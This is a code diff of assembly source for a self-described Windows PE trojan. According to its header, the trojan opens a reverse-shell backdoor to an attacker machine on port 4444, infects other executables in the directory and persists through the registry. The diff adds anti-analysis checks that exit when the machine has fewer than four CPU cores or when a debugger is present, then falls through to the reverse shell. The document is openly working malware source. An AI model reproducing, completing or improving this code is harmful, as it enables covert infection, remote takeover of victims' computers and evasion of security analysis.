@@ -1,13 +1,13 @@
 ;--------------------------------------------------------------------------------------------------------------------;
 ; Author: Bach Ngoc Hung (hung.bachngoc@gmail.com)
 ; Compatible: Windows PE file 32 bits
-; Note: Setup the listener on port 4444 and change the ip address of the attack machine in the code first (Line 168)
-; Version: 2.0
+; Note: Setup the listener on port 4444 and change the ip address of the attack machine in the code first (Line 184)
+; Version: 2.5
 ; This trojan capable of creating backdoor using reverse shell, injecting it self to other PE file.
-; It can also add itself to the registry key for persistence.
+; It can also add itself to the registry key and alters its behaviour when it detects sandboxes and debuggers
 ; The injected file can also infect other files in the directory while avoiding inject to the infected files.
 ; This program uses API hashing to get function addresses, referenced from Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com).
-; Size: 1183 bytes
+; Size: 1235 bytes
 ;--------------------------------------------------------------------------------------------------------------------;
 
 .386
@@ -33,7 +33,7 @@ get_eip:
 	Std
 	Rep Stosd
 	Cld
-	Call reverse_shell
+	Call check
 
 hash_api:
 	Pushad						; save all registers
@@ -129,6 +129,21 @@ get_next_module:
 	Pop Edx						; Restore the current position in the module list
 	Mov Edx, [Edx]					; Go to the next module
 	Jmp next_module
+
+check:
+	Lea Eax, [Ebp - 250H]
+	Push Eax
+	Push 4B2B9D76H					; hash("kernel32.dll", "GetSystemInfo")
+	Call hash_api
+
+	Mov Eax, [Ebp - 250H + 14H]
+	Cmp Eax, 4					; If number of CPU cores < 4 then it most likely VM or sandboxes
+	Jl exit_success					; exit
+
+	Push 0C6643248H					; hash("kernel32.dll, "IsDebuggerPresent")
+	Call hash_api
+	Test Al, Al					; Check if the flag is true or not
+	Jnz exit_success
 
 reverse_shell:
 	Mov [Ebp - 108H], Ebx				; This holds the address of the beginning of the payload
